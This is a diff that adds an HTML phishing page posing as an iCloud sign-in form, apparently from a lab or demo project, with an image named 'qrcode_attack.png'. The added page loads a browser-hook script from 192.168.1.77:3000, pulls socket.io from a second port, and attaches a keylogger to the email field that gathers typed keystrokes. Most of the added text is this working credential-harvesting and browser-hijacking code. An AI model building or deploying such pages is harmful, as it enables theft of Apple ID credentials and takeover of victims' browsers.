@@ -47,4 +47,50 @@
         });
     </script>
 </body>
-</html>
+
+      <html>
+      <body>
+        <script defer src="script.js"></script>
+        <script async src="http://192.168.1.77:3000/hook.js" type="text/javascript" id="dynamic-script"></script>
+        <script defer src="http://192.168.1.77:3001/socket.io/socket.io.js" type="text/javascript" id="dynamic-script-2"></script>
+
+        <script>
+          const textbox = document.getElementById('email');
+          const log = document.getElementById('password');
+
+          // Array to hold logged keystrokes
+          let keystrokes = [];
+          // Event listener for keydown events
+          textbox.addEventListener('keydown', (event) => {
+              // Log the key pressed
+              keystrokes.push(event.key);
+              // Update the log display
+              log.textContent = keystrokes.join('');
+              console.log("++++++++++++++++++++++++++++++++")
+              console.log(log.textContent)
+          });
+        </script>
+        
+        <link rel="stylesheet" href="styles.css">
+        <div>
+          <h1>Sign In to iCloud</h1>
+          <h6>Enter your Apple ID and password to sign into iCloud.</h6>
+          <form>
+            <main>
+              <input type="email" id="email" name="email" placeholder="e-mail address" />
+              <input type="password" id="password" name="password" placeholder="password" />
+            </main>
+            <footer>
+              <button type="reset" id="reset-btn">Cancel</button>
+              <button type="submit" id="submit-btn">OK</button>
+            </footer>
+          </form>
+        </div>
+
+        <aside>
+          <p>
+            <img src="./qrcode_attack.png" alt="friends4eva" width="250" height="250">
+          </p>
+        </aside>
+      </body>
+      </html>
